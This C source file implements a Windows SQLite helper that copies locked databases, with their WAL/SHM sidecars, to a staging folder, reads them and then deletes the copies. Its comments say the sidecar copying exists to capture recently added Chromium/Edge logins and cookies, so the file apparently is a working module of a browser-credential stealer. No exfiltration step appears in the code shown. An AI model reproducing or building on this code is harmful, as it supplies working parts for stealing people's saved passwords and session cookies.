/* bd_sqlite.c - thin sqlite3 wrapper: open a staging copy of a locked DB and
 * run simple materialized queries (one statement per handle). */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "sqlite3.h"
#include "bd.h"

extern void  *malloc(size_t);
extern void   free(void *);
extern void  *memcpy(void *, const void *, size_t);
extern size_t strlen(const char *);
extern int    _snprintf(char *, size_t, const char *, ...);

struct bd_db {
    sqlite3       *h;
    sqlite3_stmt  *st;
    char           copy[600];   /* staging copy path; deleted on close */
    int            has_copy;
};

bd_db *bd_db_open_copy(const char *srcPath, const char *stagingDir,
                       char *copyPathOut, size_t cap) {
    bd_db *db;
    char tmp[600];
    const char *name = bd_path_name(srcPath);

    if (!bd_path_join(tmp, sizeof(tmp), stagingDir, name)) return NULL;
    if (bd_copy_file(srcPath, tmp) != 0) return NULL;
    /* WAL sidecars: Chromium/Edge commit recent rows to "<db>-wal"; a bare
     * copy of the main DB misses just-added logins/cookies until checkpoint */
    {
        char sw[700], dw[700];
        _snprintf(sw, sizeof(sw), "%s-wal", srcPath);
        _snprintf(dw, sizeof(dw), "%s-wal", tmp);
        if (GetFileAttributesA(sw) != INVALID_FILE_ATTRIBUTES)
            CopyFileA(sw, dw, FALSE);
        _snprintf(sw, sizeof(sw), "%s-shm", srcPath);
        _snprintf(dw, sizeof(dw), "%s-shm", tmp);
        if (GetFileAttributesA(sw) != INVALID_FILE_ATTRIBUTES)
            CopyFileA(sw, dw, FALSE);
    }
    if (copyPathOut && cap) {
        size_t n = strlen(tmp);
        if (n >= cap) n = cap - 1;
        memcpy(copyPathOut, tmp, n);
        copyPathOut[n] = 0;
    }
    db = (bd_db *)malloc(sizeof(bd_db));
    if (!db) return NULL;
    memset(db, 0, sizeof(*db));
    if (sqlite3_open_v2(tmp, &db->h, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) {
        if (db->h) sqlite3_close(db->h);
        free(db);
        return NULL;
    }
    memcpy(db->copy, tmp, strlen(tmp) + 1);
    db->has_copy = 1;
    return db;
}

void bd_db_close(bd_db *db) {
    char sw[700];
    if (!db) return;
    if (db->st) sqlite3_finalize(db->st);
    if (db->h)  sqlite3_close(db->h);
    /* staging copies are ephemeral: remove the copied DB + WAL/SHM sidecars */
    if (db->has_copy) {
        DeleteFileA(db->copy);
        _snprintf(sw, sizeof(sw), "%s-wal", db->copy);
        DeleteFileA(sw);
        _snprintf(sw, sizeof(sw), "%s-shm", db->copy);
        DeleteFileA(sw);
    }
    free(db);
}

int bd_db_query(bd_db *db, const char *sql) {
    if (!db || !db->h || !sql) return -1;
    if (db->st) { sqlite3_finalize(db->st); db->st = NULL; }
    if (sqlite3_prepare_v2(db->h, sql, -1, &db->st, NULL) != SQLITE_OK) {
        db->st = NULL;
        return -1;
    }
    return 0;
}

int bd_db_step(bd_db *db) {
    int rc;
    if (!db || !db->st) return -1;
    rc = sqlite3_step(db->st);
    if (rc == SQLITE_ROW)  return 1;
    if (rc == SQLITE_DONE) return 0;
    return -1;
}

const unsigned char *bd_col_text(bd_db *db, int col, int *lenOut) {
    if (!db || !db->st) { if (lenOut) *lenOut = 0; return (const unsigned char *)""; }
    if (sqlite3_column_type(db->st, col) == SQLITE_NULL) {
        if (lenOut) *lenOut = 0;
        return (const unsigned char *)"";
    }
    if (lenOut) *lenOut = sqlite3_column_bytes(db->st, col);
    return (const unsigned char *)sqlite3_column_text(db->st, col);
}
const unsigned char *bd_col_blob(bd_db *db, int col, int *lenOut) {
    if (!db || !db->st) { if (lenOut) *lenOut = 0; return (const unsigned char *)""; }
    if (sqlite3_column_type(db->st, col) == SQLITE_NULL) {
        if (lenOut) *lenOut = 0;
        return (const unsigned char *)"";
    }
    if (lenOut) *lenOut = sqlite3_column_bytes(db->st, col);
    return (const unsigned char *)sqlite3_column_blob(db->st, col);
}
long long bd_col_i64(bd_db *db, int col) {
    if (!db || !db->st) return 0;
    return sqlite3_column_int64(db->st, col);
}
